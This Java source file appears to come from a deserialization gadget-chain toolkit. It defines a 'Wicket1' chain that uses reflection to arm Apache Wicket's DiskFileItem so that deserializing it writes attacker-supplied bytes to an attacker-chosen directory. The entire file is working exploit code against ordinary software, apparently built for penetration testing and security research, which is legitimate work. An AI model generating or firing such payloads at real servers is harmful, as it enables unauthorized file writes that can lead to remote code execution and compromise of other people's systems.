package org.ses.gadgetbuilder.chains1;

import org.apache.wicket.util.io.DeferredFileOutputStream;
import org.apache.wicket.util.io.ThresholdingOutputStream;
import org.apache.wicket.util.upload.DiskFileItem;
import org.ses.gadgetbuilder.chains.main.GadgetChain;
import org.ses.gadgetbuilder.chains.main.TrampolineConnector;
import org.ses.gadgetbuilder.chains.trampolines.NoTrampoline;
import org.ses.gadgetbuilder.annotations.*;
import org.ses.gadgetbuilder.util.Reflections;

import java.io.File;
import java.io.OutputStream;
import java.nio.charset.StandardCharsets;

@Dependencies({"org.apache.wicket:wicket-util:6.23.0", "org.slf4j:slf4j-api:1.6.4"})
@Authors({ Authors.JACOBAINES })
@Impact(Impact.RandomFileWrite)
public class Wicket1 extends GadgetChain<NoTrampoline> {

    public Wicket1() {
        super(NoTrampoline.getInstance());
    }

    public Wicket1(NoTrampoline _trampoline) {
        super(_trampoline);
    }

    @Override
    protected TrampolineConnector createPayload(String command) throws Exception {
        String[] parts = command.split(":");
        byte[] data = parts[1].getBytes(StandardCharsets.US_ASCII);
        String repoPath = parts[0];
        File repository = new File(repoPath);
        DiskFileItem diskFileItem = new DiskFileItem("test", "application/octet-stream", false, "test", 100000, repository, null);
        File outputFile = new File(repoPath + File.separator + "whatever");
        DeferredFileOutputStream dfos = new DeferredFileOutputStream(data.length + 1, outputFile);
        OutputStream os = (OutputStream) Reflections.getFieldValue(dfos, "memoryOutputStream");
        os.write(data);
        Reflections.getField(ThresholdingOutputStream.class, "written").set(dfos, data.length);
        Reflections.setFieldValue(diskFileItem, "dfos", dfos);
        Reflections.setFieldValue(diskFileItem, "sizeThreshold", 0);

        return new TrampolineConnector(diskFileItem);
    }

    @Override
    protected void postProcessPayload() throws Exception {

    }


    @Override
    protected String getStackTrace() {
        return "org.apache.wicket.util.upload.DiskFileItem.readObject()\n" +
                "java.io.OutputStream.write()";
    }
}
